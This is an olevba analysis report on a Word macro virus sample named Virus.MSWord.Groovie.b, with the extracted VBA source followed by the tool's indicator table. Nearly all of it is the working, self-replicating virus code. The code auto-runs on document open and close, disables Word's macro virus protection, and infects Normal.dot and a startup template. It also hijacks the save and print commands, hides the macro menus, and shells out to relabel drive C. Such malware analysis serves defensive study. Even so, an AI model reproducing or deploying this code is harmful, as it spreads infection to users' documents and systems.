olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-410a9d91f6e2f17e625ac6828241ab5f7d13b4da
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-410a9d91f6e2f17e625ac6828241ab5f7d13b4da - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-410a9d91f6e2f17e625ac6828241ab5f7d13b4da - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Public I02 As Boolean
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Public I03 As Boolean
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Public I04 As Boolean
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Public I05 As Boolean
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Public I06 As String
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Public I07 As Boolean
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Public I08 As Boolean
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Function I09()
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If MacroContainer = NormalTemplate Then
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        I01 = "normal"
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        GoTo checkout
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    End If
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
checkout:
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Function
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Function I10()
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then I04 = True
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    Next I
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then I03 = True
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    Next I
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Function
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Function I11()
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Call I09
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Call I10
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If I01 = "document" Then Call I12
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If I01 = "normal" Then Call I13
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If I01 = "orbit" Then Call I14
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Function
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Function I12()
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If I03 = False And I05 = False Then
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        With NormalTemplate.VBProject
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        With .VBComponents.Import("c:\groovie.sys")
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        End With
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        End With
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    End If
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If I02 = False Then
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        If I08 = False Then Documents.Open FileName:=I06
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        Shell ("label c: groovie"), 0
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        Windows(1).Close
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    End If
 ' CR6/8/99 2:03:51 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Function
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Function I13()
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Application.ScreenUpdating = False
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    Call I17
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If I04 = False And I07 = True Then
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        With ActiveDocument.VBProject
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        With .VBComponents.Import("c:\groovie.sys")
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        End With
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        End With
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        With Dialogs(wdDialogFileSummaryInfo)
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            .Comments = "ALT-F11 says it's groovie!"
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            .Execute
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        End With
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    End If
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If I02 = False And I07 = True Then
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        If I08 = False Then Documents.Open FileName:=I06
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    End If
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If I02 = False And I07 = False Then
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        Documents.Add Template:="", NewTemplate:=False
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    End If
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Application.ScreenUpdating = True
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Function
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Function I14()
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Application.ScreenUpdating = False
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        If I03 = False And I05 = False Then
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            With NormalTemplate.VBProject
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            With .VBComponents.Import("c:\groovie.sys")
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            End With
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            End With
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            NormalTemplate.Save
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        End If
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        If I04 = False Then
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            With ActiveDocument.VBProject
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            With .VBComponents.Import("c:\groovie.sys")
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            End With
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            End With
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            With Dialogs(wdDialogFileSummaryInfo)
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
                .Comments = "ALT-F11 says it's groovie!"
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
                .Execute
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
            End With
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        End If
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Application.ScreenUpdating = True
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Function
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Function I15()
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    Options.VirusProtection = False
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    Options.SaveNormalPrompt = False
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    Options.ConfirmConversions = False
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    I06 = ActiveDocument.FullName
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    Call I11
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Function
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Sub AutoOpen()
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Call I15
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Sub
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Sub AutoClose()
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
I08 = True
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Call I15
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Sub
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Sub AutoExit()
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Call I15
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Sub
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Sub FileSaveAs()
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Call I16
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Call I15
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Dialogs(wdDialogFileSaveAs).Show
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Sub
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Sub filesave()
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Call I16
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Call I15
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Sub
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Sub fileclose()
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
I08 = True
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Call I15
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
ActiveDocument.Close
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Sub
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Sub fileprint()
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Call I15
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Dialogs(wdDialogFilePrint).Show
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Sub
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Sub ViewVBCode()
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
'MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Sub
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Sub ToolsMacro()
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Sub
 ' CR6/8/99 2:03:52 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Sub FileTemplates()
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Sub
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Function I17()
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
On Error GoTo docek
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    If ActiveDocument.Name <> "" Then
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
        I07 = True
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    End If
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    GoTo over
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
docek:
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
    I07 = False
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
over:
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Function
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Function I16()
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Randomize
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
rn = Int(Rnd * 999)
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").codemodule
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
For x = 2 To 358 Step 2
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
.deletelines x
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & rn & Application.ActivePrinter
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
Next x
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End With
 ' CR6/8/99 2:03:53 AM68Costin RAIU68Xerox 4900 PostScript on FILE:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
